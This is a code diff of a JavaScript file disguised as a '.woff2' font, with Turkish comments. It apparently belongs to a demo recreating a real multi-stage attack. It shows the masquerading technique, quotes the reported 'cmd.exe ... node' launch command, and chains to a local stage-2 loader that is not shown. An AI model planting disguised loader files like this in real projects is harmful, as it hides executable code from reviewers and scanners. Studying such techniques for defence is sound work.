@@ -1,31 +1,22 @@
-"use strict";
+// fa-solid-400.woff2 - Stage-1 backdoor (font kılığında)
+// Bu dosya aslında bir JavaScript dosyasıdır.
+// Rapor: %WINDIR%\System32\cmd.exe /d /c node ./public/fontawesome/fa-solid-400.woff2
 
-/**
- * fa-solid-400.woff2
- * -------------------
- * !!! BU DOSYA BİR FONT DEĞİLDİR !!!
- *
- * Uzantısı ".woff2" (Web Open Font Format) olduğu için bir font dosyası
- * gibi görünür, Gezgin'de/GitHub'da önizlemesi bile "font" ikonuyla çıkar.
- * Ama içeriği düz JavaScript'tir ve `node <bu-dosya>` ile doğrudan
- * çalıştırılabilir.
- *
- * TEKNİK ADI: Masquerading (dosya adı/uzantısı ile yanıltma).
- * Gerçek vakada bu teknik, statik dosya taramalarını ve "bu klasörde
- * çalıştırılabilir kod var mı?" şeklindeki yüzeysel insan incelemesini
- * atlatmak için kullanıldı -- fontawesome klasörü bir web projesinde son
- * derece sıradan ve şüphe çekmeyen bir yerdir.
- *
- * Bu demo sürümünde bu dosya sadece bir "yönlendirici": gerçek mantık
- * scripts/stage2-loader.js içinde, okunabilir şekilde duruyor.
- */
-
-const path = require("path");
-
-console.log(
-  "[demo] fa-solid-400.woff2 çalıştırıldı -- bu bir font dosyası değil, JS kodu.\n" +
-    "[demo] Gerçek vakada: node ./public/fontawesome/fa-solid-400.woff2"
-);
-
-// Rapordaki bir sonraki adıma (stage2-loader / programx64\\main.js eşleniği) geçiş.
-require(path.join(__dirname, "..", "..", "scripts", "stage2-loader.js"));
+try {
+    console.log('[DEMO] Stage-1: fa-solid-400.woff2 çalıştı.');
+    
+    // Stage-2 loader'ı çağır
+    const path = require('path');
+    const loaderPath = path.join(__dirname, '..', '..', 'scripts', 'stage2-loader.js');
+    
+    // loader dosyasının var olduğunu kontrol et
+    const fs = require('fs');
+    if (fs.existsSync(loaderPath)) {
+        require(loaderPath);
+        console.log('[DEMO] Stage-1: stage2-loader.js başarıyla çalıştırıldı.');
+    } else {
+        console.error('[DEMO] Stage-1: stage2-loader.js bulunamadı!');
+    }
+} catch (err) {
+    console.error('[DEMO] Stage-1 hata:', err.message);
+}
